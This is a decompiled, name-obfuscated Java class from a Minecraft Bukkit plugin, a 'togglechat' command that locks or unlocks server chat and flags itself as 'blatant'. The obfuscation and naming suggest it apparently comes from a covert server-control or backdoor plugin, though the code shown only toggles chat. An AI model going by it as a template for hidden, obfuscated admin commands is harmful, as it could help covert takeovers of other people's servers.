/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class TogglechatCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIIIllllllIlllIllIl, String llllllllllllllIIIllllllIllllIIII, String[] llllllllllllllIIIllllllIlllIllll, Player llllllllllllllIIIllllllIlllIllII) {
        if (llllllllllllllIIIllllllIlllIllIl.chatLocked) {
            llllllllllllllIIIllllllIlllIllIl.chatLocked = false;
            llllllllllllllIIIllllllIlllIllII.sendMessage(Settings.PREFIX("Chat is now unlocked again"));
        } else {
            llllllllllllllIIIllllllIlllIllIl.chatLocked = true;
            llllllllllllllIIIllllllIlllIllII.sendMessage(Settings.PREFIX("Chat is now locked"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public TogglechatCommand() {
        TogglechatCommand llllllllllllllIIIllllllIllllIlIl;
    }
}

